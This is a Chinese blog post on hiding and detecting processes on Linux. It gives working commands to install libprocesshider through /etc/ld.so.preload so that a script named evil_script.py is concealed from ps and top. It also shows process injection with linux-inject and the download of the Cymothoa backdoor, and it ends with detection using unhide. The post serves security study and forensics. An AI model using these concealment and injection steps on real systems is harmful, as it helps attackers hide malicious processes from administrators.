# Linux进程隐藏与检测




## 进程隐藏

让管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。



**网上很多方法基本都是通过如下方式来达到进程隐藏：**

1.根据分组权限来实现不同用户组查看不同的进程权限。

2.修改内核，将需要隐藏的进程的进程pid改为0（**task->pid = 0**），因为ps,top命令不会显示进程id为0的进程。

3.修改内核，hook掉系统调用，在hook函数中修改逻辑判断已达到隐藏进程。

4.在用户态修改系统调用，从而隐藏进程(libprocesshider就是此方法)。

> 以下方法与上述无直接对应关系

### 第一种方法：libprocesshider

github项目地址：https://github.com/gianlucaborello/libprocesshider

利用`LD_PRELOA`来实现系统函数的劫持，实现如下

```bash
# 下载程序编译 
git clone https://github.com/gianlucaborello/libprocesshider.git 
cd libprocesshider/ && make 

# 移动文件到/usr/local/lib/目录下 
cp libprocesshider.so /usr/local/lib/ 

# 把它加载到全局动态连接局 
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
```



测试运行evil_script.py

此时发现在top 与 ps 中都无法找到 evil_script.py





### 第二种方法：进程注入工具linux-inject

linux-inject是用于将共享对象注入Linux进程的工具

github项目地址： https://github.com/gaffffe23/linux-inject.git

```bash
# 下载程序编译 
git clone https://github.com/gaffe23/linux-inject.git 

cd linux-inject && make 

# 测试进程 
./sample-target 

# 进程注入 
./inject -n sample-target sample-library.so
```



验证进程注入成功，如下图所示：





### Cymothoa

Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工

具最大的优点就是不创建新的进程，不容易被发现。

下载地址：https://sourceforge.net/projects/cymothoa/fifiles/cymothoa-1-beta/

```bash
# 下载解压 
wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz 

tar zxvf cymothoa-1-beta.tar.gz 

#
cd cymothoa-1-beta && make
```







## 检测隐藏进程

unhide 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP / UDP端口。这个

工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。

下载地址：http://www.unhide-forensics.info/

```bash
# 安装
sudo yum install unhide 

# 使用 
unhide [options] test_list
```

使用 命令`unhide proc`发现隐藏进程evil_script.py









## 参考

https://blog.csdn.net/weixin_45225923/article/details/120122800

https://blog.csdn.net/weixin_30300523/article/details/99481499

https://blog.csdn.net/weixin_29635919/article/details/116554850?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-1.pc_relevant_default&utm_relevant_index=2









---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F%E4%B8%8E%E6%A3%80%E6%B5%8B/  

